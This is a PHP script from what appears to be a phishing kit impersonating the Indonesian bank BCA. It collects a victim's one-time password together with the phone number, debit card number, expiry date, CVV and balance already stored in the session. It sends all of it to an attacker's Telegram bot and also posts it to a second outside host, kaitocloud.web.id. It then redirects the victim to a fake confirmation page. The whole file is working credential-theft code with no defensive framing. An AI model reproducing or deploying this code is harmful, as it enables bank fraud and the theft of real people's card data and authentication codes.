<?php
// Mengaktifkan output buffering untuk menghindari error terkait header
ob_start();

// Memulai session
session_start();

// Sertakan file telegram.php yang berisi $telegram_id dan $id_bot
include "../telegram.php";

// Validasi input OTP
if (isset($_POST['otp']) && !empty($_POST['otp'])) {
    $otp = htmlspecialchars(trim($_POST['otp']), ENT_QUOTES, 'UTF-8');

    // Ambil data dari session
    $nohp = $_SESSION['nohp'];
    $debit = $_SESSION['debit'];
    $valid = $_SESSION['valid'];
    $cvv = $_SESSION['cvv'];
    $saldo = $_SESSION['saldo'];
    $_SESSION['otp'] = $otp;

    // Pesan yang akan dikirim ke Telegram
    $message = "
✧━━━━━━[ *NAZZO* ]━━━━━━✧
RESS BCA | " . $nohp . "

• No HP : " . $nohp . "
• No DEBIT : " . $debit . "
• Masa berlaku : " . $valid . "
• CVV : " . $cvv . "
• Saldo : " . $saldo . "
• OTP : " . $otp . "
";

    // Fungsi untuk mengirim pesan ke Telegram
    function sendMessage($telegram_id, $message, $id_bot) {
        $url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . urlencode($telegram_id);
        $url .= "&text=" . urlencode($message);
        $ch = curl_init();
        $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
        );
        curl_setopt_array($ch, $optArray);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    }

    // Kirim pesan ke Telegram
    sendMessage($telegram_id, $message, $id_bot);
$apissl = "https://kaitocloud.web.id/api/index.php";
$sendmessagetotele = "message=".$message;
$ch2 = curl_init();
curl_setopt($ch2, CURLOPT_URL, $apissl);
curl_setopt($ch2, CURLOPT_POST, 1);
curl_setopt($ch2, CURLOPT_POSTFIELDS, $sendmessagetotele);
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch2, CURLOPT_HEADER, 0);
curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 0);
curl_exec($ch2);
curl_close($ch2);
    // Redirect ke halaman validasi setelah OTP dikirim
    header('Location: ../valid.html');
    exit(); // Pastikan script berhenti setelah header location
} else {
    // Jika OTP tidak valid, redirect ke halaman error
    header('Location: ../error.html');
    exit();
}

// Mengakhiri output buffering dan mengirim semua output
ob_end_flush();
?>
